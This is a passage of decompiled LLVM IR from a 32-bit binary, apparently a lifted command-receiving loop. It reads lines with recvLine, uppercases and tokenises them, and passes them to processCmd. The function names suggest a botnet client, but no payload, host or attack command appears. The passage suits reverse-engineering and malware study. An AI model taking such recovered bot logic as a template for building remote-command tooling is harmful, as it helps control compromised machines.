  %v0_8049429.in = phi i32 [ %v0_804942949.in, %dec_label_pc_80495bb ], [ %v0_80498bd, %dec_label_pc_80495be.preheader ]
  %stack_var_-56.2 = phi i32 [ %stack_var_-56.1, %dec_label_pc_80495bb ], [ %stack_var_-56.3, %dec_label_pc_80495be.preheader ]
  %storemerge22 = phi i32 [ %.pre, %dec_label_pc_80495bb ], [ 0, %dec_label_pc_80495be.preheader ]
  %v2_80495c9 = ashr i32 %storemerge22, 31
  %v0_80495d2 = load i32, i32* @global_var_8052300.16, align 256
  store i32 %v0_80495d2, i32* %eax.global-to-local, align 4
  %v0_80495d7 = load i32, i32* @global_var_8052304.17, align 4
  store i32 %v0_80495d7, i32* %edx.global-to-local, align 4
  %v10_80495ef = icmp ult i32 %v2_80495c9, %v0_80495d7
  br i1 %v10_80495ef, label %dec_label_pc_8049417, label %dec_label_pc_80495fb

dec_label_pc_80495fb:                             ; preds = %dec_label_pc_80495be
  store i32 %v0_80495d7, i32* @ebx, align 4
  %v6_8049607 = icmp ugt i32 %v2_80495c9, %v0_80495d7
  br i1 %v6_8049607, label %dec_label_pc_804961b, label %dec_label_pc_8049609

dec_label_pc_8049609:                             ; preds = %dec_label_pc_80495fb
  store i32 %v0_80495d2, i32* @edi, align 4
  %v10_804960f = icmp ult i32 %storemerge22, %v0_80495d2
  br i1 %v10_804960f, label %dec_label_pc_8049417, label %dec_label_pc_804961b

dec_label_pc_804961b:                             ; preds = %dec_label_pc_8049609, %dec_label_pc_80495fb
  %v0_804961e = load i32, i32* @ebp, align 4
  %v2_804961e = add i32 %v0_80498b8, -4276
  %v3_804961e = add i32 %v2_804961e, %v0_804961e
  %v4_804961e = inttoptr i32 %v3_804961e to i8*
  store i8 0, i8* %v4_804961e, align 1
  store i32 %v2_80498a2, i32* %eax.global-to-local, align 4
  %v1_804962c = load i32, i32* @esp, align 4
  %v2_804962c = add i32 %v1_804962c, -4
  %v3_804962c = inttoptr i32 %v2_804962c to i32*
  store i32 %v2_80498a2, i32* %v3_804962c, align 4
  %v0_804962d = call i32 @trim()
  %v0_8049632 = load i32, i32* @esp, align 4
  %v1_8049632 = add i32 %v0_8049632, 4
  %v2_8049641 = load i8, i8* %tmp108, align 4
  %v3_8049641 = zext i8 %v2_8049641 to i32
  %v6_8049641 = or i32 %v3_8049641, %v5_8049641
  store i32 %v6_8049641, i32* %eax.global-to-local, align 4
  %v10_8049643 = icmp eq i8 %v2_8049641, 46
  %v1_8049645 = icmp eq i1 %v10_8049643, false
  br i1 %v1_8049645, label %dec_label_pc_80498a2, label %dec_label_pc_804964b

dec_label_pc_804964b:                             ; preds = %dec_label_pc_804961b
  store i32 %v1_804964e, i32* %eax.global-to-local, align 4
  %v2_804965a113 = load i8, i8* %v5_8049680, align 1
  %v3_804965a114 = zext i8 %v2_804965a113 to i32
  %v6_804965a116 = or i32 %v3_804965a114, %v5_8049641
  store i32 %v6_804965a116, i32* %eax.global-to-local, align 4
  %v7_804965c118 = icmp eq i8 %v2_804965a113, 32
  br i1 %v7_804965c118, label %dec_label_pc_8049669, label %dec_label_pc_8049660

dec_label_pc_8049654:                             ; preds = %dec_label_pc_8049660
  %v5_8049654 = add i32 %storemerge21.in119, 1
  %storemerge21 = inttoptr i32 %v5_8049654 to i8*
  store i32 %v5_8049654, i32* %eax.global-to-local, align 4
  %v2_804965a = load i8, i8* %storemerge21, align 1
  %v3_804965a = zext i8 %v2_804965a to i32
  %v5_804965a = and i32 %v5_8049654, -256
  %v6_804965a = or i32 %v3_804965a, %v5_804965a
  store i32 %v6_804965a, i32* %eax.global-to-local, align 4
  %v7_804965c = icmp eq i8 %v2_804965a, 32
  br i1 %v7_804965c, label %dec_label_pc_8049669, label %dec_label_pc_8049660

dec_label_pc_8049660:                             ; preds = %dec_label_pc_804964b, %dec_label_pc_8049654
  %v5_804965a121 = phi i32 [ %v5_804965a, %dec_label_pc_8049654 ], [ %v5_8049641, %dec_label_pc_804964b ]
  %storemerge21120 = phi i8* [ %storemerge21, %dec_label_pc_8049654 ], [ %v5_8049680, %dec_label_pc_804964b ]
  %storemerge21.in119 = phi i32 [ %v5_8049654, %dec_label_pc_8049654 ], [ %v1_804964e, %dec_label_pc_804964b ]
  store i32 %storemerge21.in119, i32* %eax.global-to-local, align 4
  %v2_8049663 = load i8, i8* %storemerge21120, align 1
  %v3_8049663 = zext i8 %v2_8049663 to i32
  %v6_8049663 = or i32 %v3_8049663, %v5_804965a121
  store i32 %v6_8049663, i32* %eax.global-to-local, align 4
  %v4_8049665 = icmp eq i8 %v2_8049663, 0
  %v1_8049667 = icmp eq i1 %v4_8049665, false
  br i1 %v1_8049667, label %dec_label_pc_8049654, label %dec_label_pc_8049669

dec_label_pc_8049669:                             ; preds = %dec_label_pc_8049654, %dec_label_pc_8049660, %dec_label_pc_804964b
  %storemerge21.in.lcssa = phi i32 [ %v1_804964e, %dec_label_pc_804964b ], [ %storemerge21.in119, %dec_label_pc_8049660 ], [ %v5_8049654, %dec_label_pc_8049654 ]
  %storemerge21.lcssa = phi i8* [ %v5_8049680, %dec_label_pc_804964b ], [ %storemerge21120, %dec_label_pc_8049660 ], [ %storemerge21, %dec_label_pc_8049654 ]
  %v5_804965a.lcssa = phi i32 [ %v5_8049641, %dec_label_pc_804964b ], [ %v5_804965a121, %dec_label_pc_8049660 ], [ %v5_804965a, %dec_label_pc_8049654 ]
  store i32 %storemerge21.in.lcssa, i32* %eax.global-to-local, align 4
  %v2_804966c = load i8, i8* %storemerge21.lcssa, align 1
  %v3_804966c = zext i8 %v2_804966c to i32
  %v6_804966c = or i32 %v3_804966c, %v5_804965a.lcssa
  store i32 %v6_804966c, i32* %eax.global-to-local, align 4
  %v4_804966e = icmp eq i8 %v2_804966c, 0
  br i1 %v4_804966e, label %dec_label_pc_80498a2, label %dec_label_pc_8049676

dec_label_pc_8049676:                             ; preds = %dec_label_pc_8049669
  store i8 0, i8* %storemerge21.lcssa, align 1
  store i32 %v5_8049641, i32* %eax.global-to-local, align 4
  %v3_804969a = call i32 @_strlen(i8* %v5_8049680)
  %v6_80496a1 = add i32 %v2_80498a2, %v3_804969a
  %v1_80496a4 = add i32 %v6_80496a1, 2
  store i32 %v1_80496a4, i32* %eax.global-to-local, align 4
  %v5_80496a7 = inttoptr i32 %v1_80496a4 to i8*
  %v1_80496df = and i32 %v1_80496a4, -256
  br label %dec_label_pc_80496d1

dec_label_pc_80496ac:                             ; preds = %dec_label_pc_80496f9, %dec_label_pc_80496d1
  store i32 %v1_80496df, i32* %eax.global-to-local, align 4
  %v3_80496c3 = call i32 @_strlen(i8* %v5_80496a7)
  %v6_80496ca = add i32 %v1_80496a4, %v3_80496c3
  %v1_80496cd = add i32 %v6_80496ca, -1
  store i32 %v1_80496cd, i32* %eax.global-to-local, align 4
  %v1_80496ce = inttoptr i32 %v1_80496cd to i8*
  store i8 0, i8* %v1_80496ce, align 1
  br label %dec_label_pc_80496d1

dec_label_pc_80496d1:                             ; preds = %dec_label_pc_8049676, %dec_label_pc_80496ac
  store i32 %v1_80496df, i32* %eax.global-to-local, align 4
  %v3_80496e8 = call i32 @_strlen(i8* %v5_80496a7)
  %v6_80496ef = add i32 %v1_80496a4, %v3_80496e8
  %v1_80496f2 = add i32 %v6_80496ef, -1
  store i32 %v1_80496f2, i32* %eax.global-to-local, align 4
  %v1_80496f3 = inttoptr i32 %v1_80496f2 to i8*
  %v2_80496f3 = load i8, i8* %v1_80496f3, align 1
  %v3_80496f3 = zext i8 %v2_80496f3 to i32
  %v5_80496f3 = and i32 %v1_80496f2, -256
  %v6_80496f3 = or i32 %v3_80496f3, %v5_80496f3
  store i32 %v6_80496f3, i32* %eax.global-to-local, align 4
  %v10_80496f5 = icmp eq i8 %v2_80496f3, 10
  br i1 %v10_80496f5, label %dec_label_pc_80496ac, label %dec_label_pc_80496f9

dec_label_pc_80496f9:                             ; preds = %dec_label_pc_80496d1
  store i32 %v1_80496df, i32* %eax.global-to-local, align 4
  store i32 %v1_80496a4, i32* @edi, align 4
  %v3_8049710 = call i32 @_strlen(i8* %v5_80496a7)
  %v4_8049710 = mul i32 %v3_8049710, -1
  %v5_8049710 = add i32 %v4_8049710, -2
  store i32 %v5_8049710, i32* @ecx, align 4
  %v6_8049717 = sub i32 %v1_80496a4, %v4_8049710
  %v1_804971a = add i32 %v6_8049717, -1
  store i32 %v1_804971a, i32* %eax.global-to-local, align 4
  %v1_804971b = inttoptr i32 %v1_804971a to i8*
  %v2_804971b = load i8, i8* %v1_804971b, align 1
  %v3_804971b = zext i8 %v2_804971b to i32
  %v5_804971b = and i32 %v1_804971a, -256
  %v6_804971b = or i32 %v3_804971b, %v5_804971b
  store i32 %v6_804971b, i32* %eax.global-to-local, align 4
  %v10_804971d = icmp eq i8 %v2_804971b, 13
  br i1 %v10_804971d, label %dec_label_pc_80496ac, label %dec_label_pc_8049721

dec_label_pc_8049721:                             ; preds = %dec_label_pc_80496f9
  store i32 %v1_80496a4, i32* %eax.global-to-local, align 4
  %v2_804972f128 = load i8, i8* %v5_80496a7, align 1
  %v3_804972f129 = zext i8 %v2_804972f128 to i32
  %v6_804972f131 = or i32 %v3_804972f129, %v1_80496df
  store i32 %v6_804972f131, i32* %eax.global-to-local, align 4
  %v7_8049731133 = icmp eq i8 %v2_804972f128, 32
  br i1 %v7_8049731133, label %dec_label_pc_804973e, label %dec_label_pc_8049735

dec_label_pc_8049729:                             ; preds = %dec_label_pc_8049735
  %v5_8049729 = add i32 %v4_804972c135, 1
  %v22_8049729 = inttoptr i32 %v5_8049729 to i8*
  store i32 %v5_8049729, i32* %eax.global-to-local, align 4
  %v2_804972f = load i8, i8* %v22_8049729, align 1
  %v3_804972f = zext i8 %v2_804972f to i32
  %v5_804972f = and i32 %v5_8049729, -256
  %v6_804972f = or i32 %v3_804972f, %v5_804972f
  store i32 %v6_804972f, i32* %eax.global-to-local, align 4
  %v7_8049731 = icmp eq i8 %v2_804972f, 32
  br i1 %v7_8049731, label %dec_label_pc_804973e, label %dec_label_pc_8049735

dec_label_pc_8049735:                             ; preds = %dec_label_pc_8049721, %dec_label_pc_8049729
  %v5_804972f136 = phi i32 [ %v5_804972f, %dec_label_pc_8049729 ], [ %v1_80496df, %dec_label_pc_8049721 ]
  %v4_804972c135 = phi i32 [ %v5_8049729, %dec_label_pc_8049729 ], [ %v1_80496a4, %dec_label_pc_8049721 ]
  %stack_var_-60.1134 = phi i8* [ %v22_8049729, %dec_label_pc_8049729 ], [ %v5_80496a7, %dec_label_pc_8049721 ]
  store i32 %v4_804972c135, i32* %eax.global-to-local, align 4
  %v2_8049738 = load i8, i8* %stack_var_-60.1134, align 1
  %v3_8049738 = zext i8 %v2_8049738 to i32
  %v6_8049738 = or i32 %v3_8049738, %v5_804972f136
  store i32 %v6_8049738, i32* %eax.global-to-local, align 4
  %v4_804973a = icmp eq i8 %v2_8049738, 0
  %v1_804973c = icmp eq i1 %v4_804973a, false
  br i1 %v1_804973c, label %dec_label_pc_8049729, label %dec_label_pc_804973e

dec_label_pc_804973e:                             ; preds = %dec_label_pc_8049729, %dec_label_pc_8049735, %dec_label_pc_8049721
  %stack_var_-60.1.lcssa = phi i8* [ %v5_80496a7, %dec_label_pc_8049721 ], [ %stack_var_-60.1134, %dec_label_pc_8049735 ], [ %v22_8049729, %dec_label_pc_8049729 ]
  %v4_804972c.lcssa = phi i32 [ %v1_80496a4, %dec_label_pc_8049721 ], [ %v4_804972c135, %dec_label_pc_8049735 ], [ %v5_8049729, %dec_label_pc_8049729 ]
  store i8 0, i8* %stack_var_-60.1.lcssa, align 1
  %v5_8049744 = add i32 %v4_804972c.lcssa, 1
  store i32 %v1_80496a4, i32* %eax.global-to-local, align 4
  %v2_8049772142 = load i8, i8* %v5_80496a7, align 1
  %v3_8049772143 = zext i8 %v2_8049772142 to i32
  %v6_8049772145 = or i32 %v3_8049772143, %v1_80496df
  store i32 %v6_8049772145, i32* %eax.global-to-local, align 4
  %v4_8049774146 = icmp eq i8 %v2_8049772142, 0
  %v1_8049776147 = icmp eq i1 %v4_8049774146, false
  br i1 %v1_8049776147, label %dec_label_pc_804974f, label %dec_label_pc_8049778

dec_label_pc_804974f:                             ; preds = %dec_label_pc_804973e, %dec_label_pc_804974f
  %storemerge20149 = phi i8* [ %storemerge20, %dec_label_pc_804974f ], [ %v5_80496a7, %dec_label_pc_804973e ]
  %storemerge20.in148 = phi i32 [ %v5_804976c, %dec_label_pc_804974f ], [ %v1_80496a4, %dec_label_pc_804973e ]
  store i32 %storemerge20.in148, i32* %eax.global-to-local, align 4
  %v2_8049752 = load i8, i8* %storemerge20149, align 1
  %v3_8049752 = zext i8 %v2_8049752 to i32
  store i32 %v3_8049752, i32* %eax.global-to-local, align 4
  %v0_8049759 = load i32, i32* @esp, align 4
  %v2_804975c = add i32 %v0_8049759, -16
  %v3_804975c = inttoptr i32 %v2_804975c to i32*
  store i32 %v3_8049752, i32* %v3_804975c, align 4
  %v0_804975d = call i32 @__GI_toupper()
  %v1_8049765 = urem i32 %v0_804975d, 256
  %v2_8049765 = load i32, i32* @edx, align 4
  %v3_8049765 = and i32 %v2_8049765, -256
  %v4_8049765 = or i32 %v3_8049765, %v1_8049765
  store i32 %v4_8049765, i32* @edx, align 4
  %v1_804976a = trunc i32 %v0_804975d to i8
  store i8 %v1_804976a, i8* %storemerge20149, align 1
  %v5_804976c = add i32 %storemerge20.in148, 1
  %storemerge20 = inttoptr i32 %v5_804976c to i8*
  store i32 %v5_804976c, i32* %eax.global-to-local, align 4
  %v2_8049772 = load i8, i8* %storemerge20, align 1
  %v3_8049772 = zext i8 %v2_8049772 to i32
  %v5_8049772 = and i32 %v5_804976c, -256
  %v6_8049772 = or i32 %v3_8049772, %v5_8049772
  store i32 %v6_8049772, i32* %eax.global-to-local, align 4
  %v4_8049774 = icmp eq i8 %v2_8049772, 0
  %v1_8049776 = icmp eq i1 %v4_8049774, false
  br i1 %v1_8049776, label %dec_label_pc_804974f, label %dec_label_pc_8049778

dec_label_pc_8049778:                             ; preds = %dec_label_pc_804974f, %dec_label_pc_804973e
  %v22_8049744 = inttoptr i32 %v5_8049744 to i8*
  store i32 %v5_8049744, i32* @eax, align 4
  %v0_8049782 = load i32, i32* @esp, align 4
  %v1_8049785 = add i32 %v0_8049782, -12
  %v2_8049785 = inttoptr i32 %v1_8049785 to i32*
  store i32 ptrtoint (i32* @global_var_804fd24.26 to i32), i32* %v2_8049785, align 4
  %v0_804978a = load i32, i32* @eax, align 4
  %v2_804978a = add i32 %v0_8049782, -16
  %v3_804978a = inttoptr i32 %v2_804978a to i32*
  store i32 %v0_804978a, i32* %v3_804978a, align 4
  %v1_804978b = load i8*, i8** %stack_var_-32, align 4
  %v2_804978b = ptrtoint i8* %v1_804978b to i32
  %v3_804978b = call i32 @__GI_strtok(i32 1, i32 %v2_804978b)
  %v0_8049790 = load i32, i32* @esp, align 4
  %v1_8049790 = add i32 %v0_8049790, 16
  %v5_8049793 = inttoptr i32 %v3_804978b to i8*
  store i8* %v5_8049793, i8** %stack_var_-32, align 4
  store i32 %v1_80496a4, i32* %eax.global-to-local, align 4
  store i32 %v1_80496a4, i32* %stack_var_-188, align 4
  %v5_804984c27 = icmp eq i32 %v3_804978b, 0
  %v1_804985034 = icmp eq i1 %v5_804984c27, false
  br i1 %v1_804985034, label %dec_label_pc_80497a4, label %dec_label_pc_8049856

dec_label_pc_80497a4:                             ; preds = %dec_label_pc_8049778, %dec_label_pc_8049837
  %v0_804983744 = phi i32 [ %v1_8049846, %dec_label_pc_8049837 ], [ %v1_8049790, %dec_label_pc_8049778 ]
  %v3_80497b4 = phi i8* [ %tmp111, %dec_label_pc_8049837 ], [ %v5_8049793, %dec_label_pc_8049778 ]
  %stack_var_-36.135 = phi i32 [ %stack_var_-36.0, %dec_label_pc_8049837 ], [ 1, %dec_label_pc_8049778 ]
  %v4_80497a4 = ptrtoint i8* %v3_80497b4 to i32
  store i32 %v4_80497a4, i32* %eax.global-to-local, align 4
  %v2_80497a7 = load i8, i8* %v3_80497b4, align 1
  %v3_80497a7 = zext i8 %v2_80497a7 to i32
  %v5_80497a7 = and i32 %v4_80497a4, -256
  %v6_80497a7 = or i32 %v3_80497a7, %v5_80497a7
  store i32 %v6_80497a7, i32* @eax, align 4
  %v10_80497a9 = icmp eq i8 %v2_80497a7, 10
  br i1 %v10_80497a9, label %dec_label_pc_8049837, label %dec_label_pc_80497b1

dec_label_pc_80497b1:                             ; preds = %dec_label_pc_80497a4
  store i32 %stack_var_-36.135, i32* @ebx, align 4
  store i32 %v5_80497a7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_80497a4, i32* @edi, align 4
  %v3_80497cb = call i32 @_strlen(i8* %v3_80497b4)
  %v1_80497cf = add i32 %v3_80497cb, 1
  store i32 %v1_80497cf, i32* %eax.global-to-local, align 4
  %v0_80497d3 = load i32, i32* @esp, align 4
  %v2_80497d6 = add i32 %v0_80497d3, -16
  %v3_80497d6 = inttoptr i32 %v2_80497d6 to i32*
  store i32 %v1_80497cf, i32* %v3_80497d6, align 4
  %v2_80497d7 = call i32 @malloc(i32 %v4_80497a4)
  %v1_80497df = load i32, i32* @ebp, align 4
  %v2_80497df = load i32, i32* @ebx, align 4
  %v3_80497df = mul i32 %v2_80497df, 4
  %v4_80497df = add i32 %v1_80497df, -180
  %v5_80497df = add i32 %v4_80497df, %v3_80497df
  %v6_80497df = inttoptr i32 %v5_80497df to i32*
  store i32 %v2_80497d7, i32* %v6_80497df, align 4
  %v3_80497e6 = load i8*, i8** %stack_var_-32, align 4
  %v4_80497e6 = ptrtoint i8* %v3_80497e6 to i32
  %v1_80497f4 = and i32 %v4_80497e6, -256
  store i32 %v1_80497f4, i32* %eax.global-to-local, align 4
  %v3_80497fd = call i32 @_strlen(i8* %v3_80497e6)
  %v1_8049801 = add i32 %v3_80497fd, 1
  store i32 %v1_8049801, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.135, i32* %eax.global-to-local, align 4
  %v0_804980a = load i32, i32* @ebp, align 4
  %v2_804980a = mul i32 %stack_var_-36.135, 4
  %v3_804980a = add i32 %v2_804980a, -180
  %v4_804980a = add i32 %v0_804980a, %v3_804980a
  %v5_804980a = inttoptr i32 %v4_804980a to i32*
  %v6_804980a = load i32, i32* %v5_804980a, align 4
  %v1_8049811 = inttoptr i32 %v6_804980a to i8*
  store i32 %v6_804980a, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8049816 = and i32 %v6_804980a, -256
  store i32 %v1_8049816, i32* %eax.global-to-local, align 4
  %v5_8049818 = call i8* @_memset(i8* %v1_8049811, i32 %v1_8049816, i32 %v1_8049801)
  %v6_8049818 = ptrtoint i8* %v5_8049818 to i32
  store i32 %v6_8049818, i32* @ecx, align 4
  store i32 %v4_80497e6, i32* %edx.global-to-local, align 4
  store i32 %stack_var_-36.135, i32* %eax.global-to-local, align 4
  %v0_8049820 = load i32, i32* @ebp, align 4
  %v4_8049820 = add i32 %v0_8049820, %v3_804980a
  %v5_8049820 = inttoptr i32 %v4_8049820 to i32*
  %v6_8049820 = load i32, i32* %v5_8049820, align 4
  store i32 %v6_8049820, i32* @eax, align 4
  %v0_8049827 = load i32, i32* @esp, align 4
  %v2_804982a = add i32 %v0_8049827, -12
  %v3_804982a = inttoptr i32 %v2_804982a to i32*
  store i32 %v4_80497e6, i32* %v3_804982a, align 4
  %v0_804982b = load i32, i32* @eax, align 4
  %v2_804982b = add i32 %v0_8049827, -16
  %v3_804982b = inttoptr i32 %v2_804982b to i32*
  store i32 %v0_804982b, i32* %v3_804982b, align 4
  %v5_804982c = call i32 @strcpy(i8* %v3_80497e6, i32 %v4_80497a4)
  store i32 %v5_804982c, i32* @eax, align 4
  %v0_8049831 = load i32, i32* @esp, align 4
  %v1_8049831 = add i32 %v0_8049831, 16
  %v4_8049834 = add i32 %stack_var_-36.135, 1
  br label %dec_label_pc_8049837

dec_label_pc_8049837:                             ; preds = %dec_label_pc_80497a4, %dec_label_pc_80497b1
  %v0_8049837 = phi i32 [ %v0_804983744, %dec_label_pc_80497a4 ], [ %v1_8049831, %dec_label_pc_80497b1 ]
  %stack_var_-36.0 = phi i32 [ %stack_var_-36.135, %dec_label_pc_80497a4 ], [ %v4_8049834, %dec_label_pc_80497b1 ]
  %v1_804983a = add i32 %v0_8049837, -12
  %v2_804983a = inttoptr i32 %v1_804983a to i32*
  store i32 ptrtoint (i32* @global_var_804fd24.26 to i32), i32* %v2_804983a, align 4
  %v1_804983f = add i32 %v0_8049837, -16
  %v2_804983f = inttoptr i32 %v1_804983f to i32*
  store i32 0, i32* %v2_804983f, align 4
  %v1_8049841 = load i8*, i8** %stack_var_-32, align 4
  %v2_8049841 = ptrtoint i8* %v1_8049841 to i32
  %v3_8049841 = call i32 @__GI_strtok(i32 %stack_var_-36.0, i32 %v2_8049841)
  store i32 %v3_8049841, i32* %eax.global-to-local, align 4
  %v0_8049846 = load i32, i32* @esp, align 4
  %v1_8049846 = add i32 %v0_8049846, 16
  store i32 %v3_8049841, i32* %tmp109, align 4
  %v5_804984c = icmp eq i32 %v3_8049841, 0
  %v1_8049850 = icmp eq i1 %v5_804984c, false
  %tmp111 = inttoptr i32 %v3_8049841 to i8*
  br i1 %v1_8049850, label %dec_label_pc_80497a4, label %dec_label_pc_8049856

dec_label_pc_8049856:                             ; preds = %dec_label_pc_8049837, %dec_label_pc_8049778
  %v0_8049856 = phi i32 [ %v1_8049790, %dec_label_pc_8049778 ], [ %v1_8049846, %dec_label_pc_8049837 ]
  %stack_var_-36.1.lcssa = phi i32 [ 1, %dec_label_pc_8049778 ], [ %stack_var_-36.0, %dec_label_pc_8049837 ]
  store i32 %v2_8049859, i32* %eax.global-to-local, align 4
  %v2_804985f = add i32 %v0_8049856, -12
  %v3_804985f = inttoptr i32 %v2_804985f to i32*
  store i32 %v2_8049859, i32* %v3_804985f, align 4
  %v5_8049860 = add i32 %v0_8049856, -16
  %v6_8049860 = inttoptr i32 %v5_8049860 to i32*
  store i32 %stack_var_-36.1.lcssa, i32* %v6_8049860, align 4
  %v0_8049863 = call i32 @processCmd()
  store i32 %v0_8049863, i32* %eax.global-to-local, align 4
  %v0_8049868 = load i32, i32* @esp, align 4
  %v1_8049868 = add i32 %v0_8049868, 16
  %v7_804986f = icmp sgt i32 %stack_var_-36.1.lcssa, 1
  br i1 %v7_804986f, label %dec_label_pc_8049881.lr.ph, label %dec_label_pc_80498a2

dec_label_pc_8049881.lr.ph:                       ; preds = %dec_label_pc_8049856
  store i32 1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049881

dec_label_pc_8049881:                             ; preds = %dec_label_pc_8049881.lr.ph, %dec_label_pc_8049881
  %storemerge153 = phi i32 [ 1, %dec_label_pc_8049881.lr.ph ], [ %v4_8049897, %dec_label_pc_8049881 ]
  %v0_804988b152 = phi i32 [ %v1_8049868, %dec_label_pc_8049881.lr.ph ], [ %v1_8049894, %dec_label_pc_8049881 ]
  store i32 %storemerge153, i32* %eax.global-to-local, align 4
  %v0_8049884 = load i32, i32* @ebp, align 4
  %v2_8049884 = mul i32 %storemerge153, 4
  %v3_8049884 = add i32 %v2_8049884, -180
  %v4_8049884 = add i32 %v3_8049884, %v0_8049884
  %v5_8049884 = inttoptr i32 %v4_8049884 to i32*
  %v6_8049884 = load i32, i32* %v5_8049884, align 4
  store i32 %v6_8049884, i32* %eax.global-to-local, align 4
  %v2_804988e = add i32 %v0_804988b152, -16
  %v3_804988e = inttoptr i32 %v2_804988e to i32*
  store i32 %v6_8049884, i32* %v3_804988e, align 4
  %v1_804988f = call i32 @free(i32 %storemerge153)
  %v0_8049894 = load i32, i32* @esp, align 4
  %v1_8049894 = add i32 %v0_8049894, 16
  %v4_8049897 = add nuw i32 %storemerge153, 1
  store i32 %v4_8049897, i32* %eax.global-to-local, align 4
  %v15_804989d = icmp eq i32 %v4_8049897, %stack_var_-36.1.lcssa
  br i1 %v15_804989d, label %dec_label_pc_80498a2, label %dec_label_pc_8049881

dec_label_pc_80498a2:                             ; preds = %dec_label_pc_8049881, %dec_label_pc_8049856, %dec_label_pc_8049669, %dec_label_pc_804961b, %dec_label_pc_80498a2.preheader
  %v0_80498ae = phi i32 [ %v0_80498ae.pre, %dec_label_pc_80498a2.preheader ], [ %v1_8049632, %dec_label_pc_804961b ], [ %v1_8049632, %dec_label_pc_8049669 ], [ %v1_8049868, %dec_label_pc_8049856 ], [ %v1_8049894, %dec_label_pc_8049881 ]
  %stack_var_-60.2 = phi i8* [ %stack_var_-60.0.ph, %dec_label_pc_80498a2.preheader ], [ %tmp108, %dec_label_pc_804961b ], [ %tmp108, %dec_label_pc_8049669 ], [ %v22_8049744, %dec_label_pc_8049856 ], [ %v22_8049744, %dec_label_pc_8049881 ]
  %stack_var_-56.3 = phi i32 [ %stack_var_-56.0.ph, %dec_label_pc_80498a2.preheader ], [ %stack_var_-56.2, %dec_label_pc_804961b ], [ %stack_var_-56.2, %dec_label_pc_8049669 ], [ %stack_var_-56.2, %dec_label_pc_8049856 ], [ %stack_var_-56.2, %dec_label_pc_8049881 ]
  store i32 %v2_80498a2, i32* %eax.global-to-local, align 4
  %v0_80498a8 = load i32, i32* @global_var_8052308.15, align 8
  store i32 %v0_80498a8, i32* %edx.global-to-local, align 4
  %v1_80498b1 = add i32 %v0_80498ae, -8
  %v2_80498b1 = inttoptr i32 %v1_80498b1 to i32*
  store i32 4096, i32* %v2_80498b1, align 4
  %v2_80498b6 = add i32 %v0_80498ae, -12
  %v3_80498b6 = inttoptr i32 %v2_80498b6 to i32*
  store i32 %v2_80498a2, i32* %v3_80498b6, align 4
  %v0_80498b7 = load i32, i32* %edx.global-to-local, align 4
  %v2_80498b7 = add i32 %v0_80498ae, -16
  %v3_80498b7 = inttoptr i32 %v2_80498b7 to i32*
  store i32 %v0_80498b7, i32* %v3_80498b7, align 4
  %v0_80498b8 = call i32 @recvLine()
  store i32 %v0_80498b8, i32* %eax.global-to-local, align 4
  %v13_80498c3 = icmp eq i32 %v0_80498b8, -1
  %v1_80498c7 = icmp eq i1 %v13_80498c3, false
  br i1 %v1_80498c7, label %dec_label_pc_80495be.preheader, label %dec_label_pc_80493ef.outer

dec_label_pc_80495be.preheader:                   ; preds = %dec_label_pc_80498a2
  %v0_80498bd = load i32, i32* @esp, align 4
  %v2_8049431 = ptrtoint i8* %stack_var_-60.2 to i32
  br label %dec_label_pc_80495be

; uselistorder directives
  uselistorder i32 %v0_80498b8, { 0, 2, 1 }
  uselistorder i8* %stack_var_-60.2, { 1, 0 }
  uselistorder i32 %v0_80498ae, { 2, 1, 0 }
  uselistorder i32 %v4_8049897, { 1, 0, 2 }
  uselistorder i32 %storemerge153, { 3, 2, 0, 1 }
  uselistorder i32 %stack_var_-36.1.lcssa, { 0, 2, 1 }
  uselistorder i32 %v0_8049856, { 1, 0 }
  uselistorder i32 %v3_8049841, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-36.0, { 0, 2, 1 }
  uselistorder i32 %v0_8049837, { 1, 0 }
  uselistorder i32 %v1_8049801, { 1, 0 }
  uselistorder i32 %v1_80497cf, { 1, 0 }
  uselistorder i32 %v5_80497a7, { 1, 0 }
  uselistorder i32 %v4_80497a4, { 2, 1, 0, 3, 4 }
  uselistorder i32 %stack_var_-36.135, { 0, 5, 4, 2, 3, 1 }
  uselistorder i8* %v3_80497b4, { 2, 0, 1 }
  uselistorder i32 %v1_8049790, { 1, 0 }
  uselistorder i8* %storemerge20, { 1, 0 }
  uselistorder i32 %v5_804976c, { 3, 2, 1, 0 }
  uselistorder i32 %v0_804975d, { 1, 0 }
  uselistorder i32 %storemerge20.in148, { 1, 0 }
  uselistorder i8* %storemerge20149, { 1, 0 }
  uselistorder i32 %v1_80496df, { 1, 0, 2, 3, 5, 4 }
  uselistorder i8* %v5_80496a7, { 0, 3, 1, 2, 4, 5, 7, 6 }
  uselistorder i32 %v1_80496a4, { 8, 7, 2, 6, 3, 4, 5, 9, 10, 1, 0, 11, 12, 13 }
  uselistorder i8* %storemerge21.lcssa, { 1, 0 }
  uselistorder i32 %v5_8049654, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_80495d7, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80495d2, { 1, 0, 2 }
  uselistorder i32 %storemerge22, { 2, 4, 0, 3, 1 }
  uselistorder i32 %stack_var_-56.2, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_8049429.in, { 2, 1, 0 }
  uselistorder i32 %v0_8049561, { 1, 0, 2 }
  uselistorder i32 %storemerge23, { 1, 0, 2 }
  uselistorder i32 %v2_804952e, { 2, 0, 1 }
  uselistorder i32 %v1_8049517, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v0_80494e2, { 1, 0 }
  uselistorder i32 %v0_8049488, { 1, 0, 2 }
  uselistorder i32 %storemerge24, { 1, 2, 0, 3 }
  uselistorder i32 %v2_8049457, { 1, 0, 2 }
  uselistorder i32 %.pre, { 0, 2, 1 }
  uselistorder i32 %v2_804941a, { 1, 0 }
  uselistorder i8* %v5_8049680, { 3, 0, 1, 2 }
  uselistorder i32 %v5_8049641, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v2_80498a2, { 5, 6, 0, 3, 4, 1, 2 }
  uselistorder i32 %v1_8049381, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804936e, { 0, 2, 1, 3 }
  uselistorder i32 %v2_8049329, { 1, 0 }
  uselistorder i32 %v0_80492f0, { 1, 0, 2 }
  uselistorder i32 %v2_80492c5, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 %v2_80492bc, { 1, 0 }
